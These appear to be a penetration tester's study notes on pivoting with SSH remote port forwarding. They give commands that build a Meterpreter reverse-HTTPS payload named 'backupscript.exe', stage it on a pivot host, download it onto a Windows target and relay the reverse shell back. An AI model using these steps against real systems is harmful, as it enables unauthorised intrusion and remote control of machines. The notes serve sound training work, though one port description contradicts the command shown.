![[Pasted image 20230407141630.png|700]]
- In the above case, using [[01. Dynamic Port Forwarding with SSH and SOCKS Tunneling|ssh port forwarding]] the connection is essentially one way.
	- The Windows host does not have any direct connect to the network the attack host is on. 
	- This would prevent us from getting reverse shells or doing anything limited by RDP.
- We need to find a pivot host: a common connection between the attack host and the Windows server.
	- In the example the pivot is the Ubuntu server since it can connect to both hosts.
- To gain a Meterpreter shell on windows we create a Meterpreter HTTPS payload with `msfvenom` but the configuration of the reverse connection for the payload would be the pivot server's IP (172.16.5.129)
	- We will use port 8080 on the Ubuntu server to forward all of the reverse packts to the Attack hosts' port 8000, where msf is listening.

#### Creating the Payload with msfvenom
``` bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
- Then start a multi/handler set up with the matching payload and lport 8000

#### Transfer Payload to Pivot Host
``` bash
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```
- SCP is chosen here because we already have SSH credentials on the pivot host.

#### Start Python3 Webserver on Pivot Host
``` bash
python3 -m http.server 8123
```

#### Download Payload on Windows Target
``` powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

#### Using ssh -R
``` bash
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
- `-vN` enables verbose output and does not prompt the login shell.
- `-R` asks the pivot server to listen on `<InternaPivotlIp>:8000` and forward all incoming connections to port `8080` to `0.0.0.0:8000` on the attack host for our listener.

![[Pasted image 20230407143102.png|700]]